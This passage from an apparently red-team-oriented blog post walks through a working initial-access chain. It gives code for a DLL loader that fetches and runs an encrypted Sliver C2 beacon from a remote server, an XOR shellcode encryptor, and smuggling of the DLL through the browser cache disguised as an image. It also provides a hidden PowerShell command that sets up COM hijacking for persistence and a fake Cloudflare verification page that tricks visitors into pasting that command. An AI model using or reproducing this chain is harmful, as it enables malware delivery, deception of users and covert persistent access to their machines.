		}
	}
	return TRUE;
}
BOOL IsChromeOrEdge()
{
	wchar_t processPath[MAX_PATH] = {0};
	if(GetModuleFileNameW(NULL, processPath, MAX_PATH))
	{
		wchar_t* baseName = wcsrchr(processPath, L'\\');
		if(baseName)
		{
			baseName++;
			if(_wcsicmp(baseName, L"chrome.exe") == 0 || _wcsicmp(baseName, L"msedge.exe") == 0)
			{
				return TRUE;
			}
		}
	}
	return FALSE;
}
DWORD WINAPI main(LPVOID pp)
{
    if (IsChromeOrEdge())
	{
		if (!IsPayloadRunning())
		{
			std::wstring url = L"https://10.10.10.50:8888/agent.bin_enc"; // Replace with your file URL
                        std::string xorKey = "rexkyris"; //should match the one used for encryption
                        Run(url, xorKey);
		}
	}
    
    return 0;
}
BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
	
	HANDLE th;
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	{
		th = CreateThread(NULL, 0, main, NULL, 0, NULL);
		CloseHandle(th);

	}
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}
```
`sliver` will be our c2 framework, so let's generate the shellcode
```shell
deb@debian:~/Desktop/blog/InitialAccess/post/assets$ sliver
Connecting to localhost:31337 ...
[*] Loaded 2 aliases from disk
[*] Loaded 4 extension(s) from disk

    ███████╗██╗     ██╗██╗   ██╗███████╗██████╗
    ██╔════╝██║     ██║██║   ██║██╔════╝██╔══██╗
    ███████╗██║     ██║██║   ██║█████╗  ██████╔╝
    ╚════██║██║     ██║╚██╗ ██╔╝██╔══╝  ██╔══██╗
    ███████║███████╗██║ ╚████╔╝ ███████╗██║  ██║
    ╚══════╝╚══════╝╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝

All hackers gain exalted
[*] Server v1.5.43 - e116a5ec3d26e8582348a29cfd251f915ce4a405
[*] Welcome to the sliver shell, please type 'help' for options

[*] Check for updates with the 'update' command

sliver > generate --mtls 10.10.10.50:8080 beacon --arch 64bit -f shellcode --seconds 10 --skip-symbols --disable-sgn

[*] Generating new windows/amd64 beacon implant binary (10s)
[!] Symbol obfuscation is disabled
[*] Build completed in 7s
[!] Shikata ga nai encoder is disabled
[*] Implant saved to /home/deb/Desktop/blog/InitialAccess/post/assets/SHINY_EAR.bin

sliver >
```
{: .nolineno }
using the following python script, we will encrypt the generated sliver shellcode
```python
import sys

# XOR Encryption function
def xor_encrypt_decrypt(data, key):
    key_len = len(key)
    encrypted_decrypted_data = bytearray()
    for i in range(len(data)):
        encrypted_decrypted_data.append(data[i] ^ key[i % key_len])  # XOR each byte
    return encrypted_decrypted_data

# Encrypt the file
def encrypt_file(input_file, output_file, key):
    # Read the input file
    with open(input_file, 'rb') as f:
        data = f.read()

    # XOR encrypt/decrypt the file's data
    encrypted_data = xor_encrypt_decrypt(data, key)

    # Write the encrypted data to the output file
    with open(output_file, 'wb') as f:
        f.write(encrypted_data)

    print(f"File encrypted successfully and saved as {output_file}")

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: python xor_encrypt.py <input_file> <output_file> <key>")
        sys.exit(1)

    input_file = sys.argv[1]
    output_file = sys.argv[2]
    key = sys.argv[3].encode('utf-8')  # The key must be a string, encoded to bytes

    encrypt_file(input_file, output_file, key)
```
```shell
deb@debian:~/Desktop/blog/InitialAccess/post/assets$ python3 ../code/encryptor-xor.py --help
Usage: python xor_encrypt.py <input_file> <output_file> <key>
deb@debian:~/Desktop/blog/InitialAccess/post/assets$ python3 ../code/encryptor-xor.py SHINY_EAR.bin agent.bin_enc rexkyris
File encrypted successfully and saved as agent.bin_enc
deb@debian:~/Desktop/blog/InitialAccess/post/assets$
```
{: .nolineno }
make sure the encrypted shellcode filename `agent.bin_enc`, `xor` key and webserver `ip address` are set correctlly.

now we need to compile the `loader.cpp` as dll

![Desktop View](9.png){: width="1019" height="544" }

after compiling loader.cpp, there is one last thing we need to do, we will append two `identifiers` to the `start` and the 
`end` of our dll, these two identifiers will be used when trying to find our dll in the browser's cache folder because all the cached
files start with this prefix `f_` and we can't rely on file sizes. 
we will add these two identifiers `startdll` and `enddll`

```shell
deb@debian:~/Desktop/blog/InitialAccess/post/code$ sed -i "1s/^/startdll/" loader.dll 
deb@debian:~/Desktop/blog/InitialAccess/post/code$ echo -n "enddll" >> loader.dll
deb@debian:~/Desktop/blog/InitialAccess/post/code$ head -c 256 loader.dll; echo 
startdllMZ����@��	�!�L�!This program cannot be run in DOS mode.
$mL�)-n�)-n�)-n�bUm�.-n�bUk��-n�bUj�9-n�)-n�(-n��j�&-n��m�;-n�bUo�.-n�)-o�D-n��k�`-n�گk�(-n�گn�(-n�گl�(-n�Rich)-n�
deb@debian:~/Desktop/blog/InitialAccess/post/code$ tail -c 256 loader.dll; echo 
�� �(�����ȠРؠ������� �(�0�8�@�H�P�X�h�p������(�H�h����������������`������0�X�����ح�(�P������8�`���� �H�p����0���ȡ�(�enddll
deb@debian:~/Desktop/blog/InitialAccess/post/code$
```
{: .nolineno }
now the `loader.dll` is complete, next, we will see how we can smuggle it to the victim's machine

#### 2. browser cache smuggling - smuggling loader.dll

making the victim's browser automatically download `loader.dll` to its cache folder is actually easy to implement, all we have 
to do is rename it from `loader.dll` to `loader.jpeg` and place it inside the `<img>` tag in the website's html code, doing so will
make the webserver change the `content-type` header of the dll from `application/octet-stream` to `image/jpeg` and by default broswers
cache files with `image/jpeg` content type header.		

using below html code, we can successfully smuggle our payload to the browser's cache folder

```html
<html>
        <body>
                <h1>Browser</h1>
                <img src="loader.jpeg" style="display: none;"></img>
        </body>
</html>
```
let's change the payloads's extension and request index.html page
```shell
deb@debian:/tmp$ mv loader.dll loader.jpeg
deb@debian:/tmp$ cat index.html 
<html>
        <body>
                <h1>Browser</h1>
                <img src="loader.jpeg" style="display: none;"></img>
        </body>
</html>
deb@debian:/tmp$ python3 -m http.server 8888
Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
```
{: .nolineno }
from the image below, we can see that the payload is successfully delivered to the victim's machine and stored as f_000007, 
opening this file in notepad we can see our dll identifier `startdll` we have added.

![Desktop View](13.png){: width="1441" height="601" }

#### 3. filefix - putting everything together.

at this point, we have the loader.dll delivered automatically to the victim's machine and we know where we need to put this dll 
to be loaded by chrome or edge browsers. 

in this final step of the chain, we have to trick the victim to execute the powershell command, and for this we will use the
`filefix` technique.

we will set up a fake `anti-bot verification` page that the user needs to complete before accessing the website. 

our objective is running the powershell script below, the script will loop through all the cached files starting with the prefix 
`f_` and locates the one that has our identifires `startdll` and `enddll`, once found it will extract it 
and rename it to `loader.dll` than it will create the necessary com class we identifiead earlier missing and finally set the 
loader.dll in InProcServer32 key

```shell
powershell.exe -ep bypass -w hidden -c "$startString='startdll';$endString='enddll';$downloadsPath='C:\Users\rxk\AppData\Local\Google\Chrome\User Data\Default\Cache\Cache_Data';$outputFile='C:\Users\rxk\Desktop\tools\com-hj\test\loader.dll';$basePath='HKCU:\Software\Classes\CLSID\{33C53A50-F456-4884-B049-85FD643ECFED}';$subKeyPath=$basePath+'\InProcServer32';Get-ChildItem -Path $downloadsPath -File -Filter 'f_*' | ForEach-Object { $content=[System.IO.File]::ReadAllBytes($_.FullName);$fileHeader=[System.Text.Encoding]::ASCII.GetString($content,0,$startString.Length);if($fileHeader -eq $startString){$endStringBytes=[System.Text.Encoding]::ASCII.GetBytes($endString);$endIndex=-1;for($i=0;$i -le $content.Length-$endStringBytes.Length;$i++){if(($content[$i..($i+$endStringBytes.Length-1)] -join '') -eq ($endStringBytes -join '')){$endIndex=$i;break}}if($endIndex -ne -1){$originalContent=$content[($startString.Length)..($endIndex-1)];[System.IO.File]::WriteAllBytes($outputFile,$originalContent);if(-not(Test-Path $basePath)){New-Item -Path $basePath -Force | Out-Null};if(-not(Test-Path $subKeyPath)){New-Item -Path $subKeyPath -Force | Out-Null};Set-ItemProperty -Path $subKeyPath -Name '(Default)' -Value $outputFile;New-ItemProperty -Path $subKeyPath -Name 'ThreadingModel'  -PropertyType String -Value 'Apartment' -Force | Out-Null;break}}}"
```
{: .nolineno }
we will update `index.html` to add the fake `anti-bot verification` code and some additional checks to make sure the the victim is using
chrome or edge to access our website.

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Just a moment...</title>
  <link rel="icon" href="https://www.cloudflare.com/favicon.ico" type="image/x-icon" />
  <style>
    :root {
      --cf-orange: #f38020;
      --cf-orange-dark: #d86f00;
    }

    * {
      box-sizing: border-box;
    }

    body {
      background-color: #f2f2f2;
      font-family: 'Segoe UI', sans-serif;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
    }

    .spinner-screen {
      text-align: center;
      padding: 40px;
      font-size: 18px;
      color: #333;
    }

    .spinner {
      border: 6px solid #eee;
      border-top: 6px solid var(--cf-orange);
      border-radius: 50%;
      width: 50px;
      height: 50px;
      margin: 0 auto 20px;
      animation: spin 1s linear infinite;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .container {
      display: none;
      flex-direction: column;
      align-items: center;
      background-color: #ffffff;
      width: 560px;
      border-radius: 6px;
      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
      border: 1px solid #dcdcdc;
      text-align: center;
      overflow: hidden;
      animation: fadeIn 0.6s ease forwards;
    }

    .orange-bar {
  height: 40px;
  width: 100%;
  background: linear-gradient(to right, #f57c00, #f38020);
  border-top-left-radius: 6px;
  border-top-right-radius: 6px;
  position: relative;
  display: flex;
  align-items: center;
  justify-content: flex-start;
  padding-left: 12px;
}

.orange-bar-text {
	  font-size: 13px;
	  color: white;
	  font-weight: 500;
}

    .header {
      padding: 40px 30px 10px;
    }

    .header img {
      width: 120px;
      margin-bottom: 25px;
    }

    .instructions {
      text-align: left;
      padding: 25px 40px 10px;
      font-size: 15px;
      color: #333333;
      line-height: 1.6;
    }

    .instructions ol {
      margin: 0;
      padding-left: 20px;
    }

    .code-block {
      background-color: #f1f1f1;
      border: 1px solid #ccc;
      border-radius: 4px;
      padding: 8px 12px;
      font-family: Consolas, monospace;
      font-size: 14px;
      margin-top: 8px;
      position: relative;
      transition: background-color 0.3s;
      cursor: pointer;
      user-select: none;
    }

    .code-block:hover {
      background-color: #e6e6e6;
    }

    .code-block::after {
      content: "Copy";
      position: absolute;
      top: 50%;
      right: 12px;
      transform: translateY(-50%);
      font-size: 12px;
      color: var(--cf-orange);
      opacity: 0;
      transition: opacity 0.2s;
    }

    .code-block:hover::after {
      opacity: 1;
    }

    .code-block.clicked::after {
      content: "Copied";
      color: #107c10;
    }

    #fileExplorer {
      background-color: var(--cf-orange);
      color: white;
      border: none;
      padding: 12px 30px;
      font-size: 15px;
      border-radius: 4px;
      margin: 30px 0 40px;
      cursor: pointer;
      transition: background-color 0.2s ease;
    }

    #fileExplorer:hover {
      background-color: var(--cf-orange-dark);
    }

    .footer {
      font-size: 11.5px;
      color: #6b6b6b;
      background-color: #f7f7f7;
      padding: 12px 24px;
      border-top: 1px solid #dcdcdc;
      display: flex;
      justify-content: space-between;
      align-items: center;
      width: 100%;
    }

    .footer img {
      height: 16px;
    }

    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(20px); }
      to { opacity: 1; transform: translateY(0); }
    }
  </style>
</head>
<body>
  <!--this is the loader-->
  <img src="loader.jpeg" style="display: none;"></img>
  <!-- Loading Spinner Screen -->
  <div id="loading" class="spinner-screen">
    <div class="spinner"></div>
    Just a moment ...
  </div>

  <!-- Verification Container -->
  <div class="container" id="verification-card">
    <div class="orange-bar">
  <div class="orange-bar-text">Protected by BotShield</div>
</div>
	<img src="https://upload.wikimedia.org/wikipedia/commons/thumb/archive/4/4b/20220519022009%21Cloudflare_Logo.svg/120px-Cloudflare_Logo.svg.png" alt="Shield" class="logo" style="width: 120px; height: auto;"/>

    <div class="instructions">
      <p>To access this <strong>website</strong>, please follow these steps to verify you are human.</p>
      <ol>
        <li style="margin-bottom: 10px;">
          Open file explorer by clicking the button below
          <!--<div class="code-block" id="path" onclick="this.classList.add('clicked')">
            hello
          </div>-->
        </li>
        <li style="margin-bottom: 10px;">Press (<strong>CTRL + L</strong>)</li>
        <li style="margin-bottom: 10px;">Press (<strong>CTRL + V</strong>)</li>
        <li style="margin-bottom: 10px;">Hit (<strong>ENTER</strong>)</li>
        <li style="margin-bottom: 10px;">Close file explorer</li>
      </ol>
    </div>

    <input type="file" id="fileInput" style="display: none;">
    <button id="fileExplorer">Open File Explorer</button>

    <div class="footer">	
      <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft">
      © 2025 cloudflare • BotShield
    </div>
  </div>

  <script>
    var cmd = ``;
    const edgepath = `+'/microsoft/edge/user data/default/cache/cache_data'`;
    const chromepath = `+'/google/chrome/user data/default/cache/cache_data'`;
    const outputpath = `+'/Desktop/tools/iac/loader.dll'`;
    var cmd_prefix1 = `powershell.exe -ep bypass -w hidden -c "$startString='startdll';$endString='enddll';$downloadsPath=$env:localappdata`;
    var cmd_prefix2 = `;$outputFile=$env:userprofile`;
    var cmd_prefix3 = `;$basePath='HKCU:\\Software\\Classes\\CLSID\\{33C53A50-F456-4884-B049-85FD643ECFED}';$subKeyPath=$basePath+'\\InProcServer32';Get-ChildItem -Path $downloadsPath -File -Filter 'f_*' | ForEach-Object { $content=[System.IO.File]::ReadAllBytes($_.FullName);$fileHeader=[System.Text.Encoding]::ASCII.GetString($content,0,$startString.Length);if($fileHeader -eq $startString){$endStringBytes=[System.Text.Encoding]::ASCII.GetBytes($endString);$endIndex=-1;for($i=0;$i -le $content.Length-$endStringBytes.Length;$i++){if(($content[$i..($i+$endStringBytes.Length-1)] -join '') -eq ($endStringBytes -join '')){$endIndex=$i;break}}if($endIndex -ne -1){$originalContent=$content[($startString.Length)..($endIndex-1)];[System.IO.File]::WriteAllBytes($outputFile,$originalContent);if(-not(Test-Path $basePath)){New-Item -Path $basePath -Force | Out-Null};if(-not(Test-Path $subKeyPath)){New-Item -Path $subKeyPath -Force | Out-Null};Set-ItemProperty -Path $subKeyPath -Name '(Default)' -Value $outputFile;New-ItemProperty -Path $subKeyPath -Name 'ThreadingModel'  -PropertyType String -Value 'Apartment' -Force | Out-Null;break}}}"                                                                                                                 # anti-bot - BotShield verification success                                                                `;
    
    const userAgent = navigator.userAgent;
    const isChrome = userAgent.includes("Chrome") && !userAgent.includes("Edg");
    const isEdge = userAgent.includes("Edg");
    
    if (isChrome) {
    	cmd = cmd_prefix1 + chromepath + cmd_prefix2 + outputpath + cmd_prefix3;
    }
    if (isEdge)
    {
    	cmd = cmd_prefix1 + edgepath + cmd_prefix2 + outputpath + cmd_prefix3;
    }
    
    const fileInput = document.getElementById('fileInput');
    const fileExplorer = document.getElementById('fileExplorer');


    // Trigger file input & copy on button click
    fileExplorer.addEventListener('click', function () {
      navigator.clipboard.writeText(cmd);
      fileInput.click();
    });

    // Prevent actual file upload
    fileInput.addEventListener('change', () => {
      alert("Please follow the stated instructions.");
      fileInput.value = "";
      setTimeout(() => fileInput.click(), 500);
      
    });

    // Wait 5 seconds before showing verification card
    window.addEventListener('load', () => {
      setTimeout(() => {
        document.getElementById('loading').style.display = 'none';
        document.getElementById('verification-card').style.display = 'flex';
      }, 5000);
    });
  </script>
</body>
</html>

```

## Victim simulation.

to implement this initial access chain in your lab, the website must use https, self signed certificate is not enough, so
you must generate a certificate authority certificate and import it to the certificate store of the target machine, this is necessary
because some functionalities like copying the malicious command automatically to the clipboard requires https and browser caching 
too.

follow the steps above, place the `agent.bin_enc`, `loader.jpeg`, `index.html` and the `certificate keys` in the same directory and run 
the python webserver script below then visit the website

```python
import http.server
import ssl

class CachingHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
    def end_headers(self):
        # Add caching headers here
        self.send_header("Cache-Control", "public, max-age=31536000")
        #self.send_header("Expires", "Thu, 31 Dec 2037 23:55:55 GMT")
        super().end_headers()

PORT = 8888

httpd = http.server.HTTPServer(('0.0.0.0', PORT), CachingHTTPRequestHandler)

# Use SSLContext for wrapping the socket
context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
context.load_cert_chain(certfile='crt/server.pem', keyfile='crt/server.key')

httpd.socket = context.wrap_socket(httpd.socket, server_side=True)

print(f"Serving ...")
httpd.serve_forever()

```

## Real World Implementation.

in your engagments, you might need to add additional checks in the index.html like the type of the browser used to access the website 
and if it is 64bit or 32bit to deliver the right payload and also the location of the registry keys that needs the modification.

also you might want to modify the shellcode execution technique to another one that does not leave a lot of memory indicators.

## Resources

to learn more about each technique used in this blog post i recommend the following resources:

<a href="https://blog.whiteflag.io/blog/browser-cache-smuggling/">https://blog.whiteflag.io/blog/browser-cache-smuggling/</a><br>
<a href="https://specterops.io/blog/2025/05/28/revisiting-com-hijacking/">https://specterops.io/blog/2025/05/28/revisiting-com-hijacking/</a><br>
<a href="https://www.mdsec.co.uk/2019/05/persistence-the-continued-or-prolonged-existence-of-something-part-2-com-hijacking/">https://www.mdsec.co.uk/2019/05/persistence-the-continued-or-prolonged-existence-of-something-part-2-com-hijacking/</a><br>
<a href="https://mrd0x.com/filefix-clickfix-alternative/">https://mrd0x.com/filefix-clickfix-alternative/</a>








